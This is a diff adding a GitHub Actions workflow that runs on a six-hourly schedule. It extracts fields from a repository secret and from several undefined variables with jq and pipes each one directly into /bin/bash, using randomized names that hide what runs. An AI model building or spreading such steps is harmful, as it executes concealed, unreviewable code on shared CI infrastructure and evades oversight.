@@ -1,0 +1,27 @@
+name: huawudonghui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huawudonghui
+        env:
+          u2: ${{ secrets.u2 }}
+        run: |
+          echo $u2 | jq -r .vm41907 | /bin/bash
+          echo $rr19293 | jq -r .oog2 | /bin/bash
+          echo $zpnzn358 | jq -r .dna19993 | /bin/bash
+          echo $svbu2 | jq -r .h3514 | /bin/bash
+          echo $yabm86 | jq -r .xpsy5411 | /bin/bash
+          echo $dlefo563 | jq -r .x2466 | /bin/bash
+          echo $javc0 | jq -r .low96322 | /bin/bash
+          echo $gqv5 | jq -r .szfzq0 | /bin/bash
+          echo $pmkr6 | jq -r .vbf386 | /bin/bash
+          echo $tgvuv81 | jq -r .hjj79 | /bin/bash
+          echo $podb809 | jq -r .uy10 | /bin/bash
+          echo $u2191 | jq -r .k37859 | /bin/bash
+
